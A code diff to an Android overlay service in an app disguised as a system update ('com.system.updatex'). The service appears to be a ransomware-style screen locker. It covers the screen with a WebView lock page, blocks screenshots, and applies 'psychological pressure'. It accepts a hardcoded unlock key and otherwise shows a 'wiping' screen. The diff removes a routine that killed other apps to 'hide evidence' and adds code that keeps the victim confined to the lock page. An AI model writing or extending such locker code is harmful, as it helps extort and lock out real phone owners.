@@ -1,6 +1,5 @@
 package com.system.updatex;
 
-import android.app.ActivityManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
@@ -15,10 +14,10 @@ import android.os.Vibrator;
 import android.provider.Settings;
 import android.view.Gravity;
 import android.view.WindowManager;
+import android.webkit.WebResourceRequest;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import java.util.List;
 
 public class OverlayService extends Service {
     private static final String CHANNEL_ID = "fr4nx_kiosk";
@@ -62,26 +61,8 @@ public class OverlayService extends Service {
         if (!overlayAttached) {
             createOverlay();
             startPsychologicalPressure();
-            killBackgroundApps(); // Kill other apps to save battery and hide evidence
         }
         return START_STICKY;
-    }
-
-    private void killBackgroundApps() {
-        ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
-        if (am != null) {
-            List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
-            if (processes != null) {
-                for (ActivityManager.RunningAppProcessInfo process : processes) {
-                    // Don't kill our own app or the system UI (which would break the overlay)
-                    if (!process.processName.equals(getPackageName()) 
-                            && !process.processName.contains("systemui")
-                            && !process.processName.contains("launcher")) {
-                        am.killBackgroundProcesses(process.processName);
-                    }
-                }
-            }
-        }
     }
 
     private void createOverlay() {
@@ -93,7 +74,7 @@ public class OverlayService extends Service {
                 WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
-                WindowManager.LayoutParams.FLAG_SECURE, // Blocks Screenshots
+                WindowManager.LayoutParams.FLAG_SECURE, 
                 PixelFormat.TRANSLUCENT
         );
         windowParams.gravity = Gravity.TOP | Gravity.START;
@@ -107,8 +88,18 @@ public class OverlayService extends Service {
         webSettings.setAllowFileAccessFromFileURLs(true);
         
         lockWebView.setBackgroundColor(0xFF050000);
-        // We removed the external browser override. It stays IN the app.
-        lockWebView.setWebViewClient(new WebViewClient());
+        
+        // THIS PREVENTS THE BLACK SCREEN ERROR
+        lockWebView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                // If it's a normal web link, load it. If it's a weird app scheme, ignore it.
+                if (url.startsWith("http://") || url.startsWith("https://")) {
+                    return false; // Load in WebView
+                }
+                return true; // Ignore weird schemes (intent://, whatsapp://)
+            }
+        });
         
         lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
         lockWebView.loadUrl("file:///android_asset/lock_screen.html");
@@ -134,7 +125,7 @@ public class OverlayService extends Service {
     }
 
     public void authenticateUser(String pass) {
-        if ("FR4NX.COM123".equals(pass)) { // UPDATED KEY
+        if ("FR4NX.COM123".equals(pass)) { 
             lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
         } else {
             lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
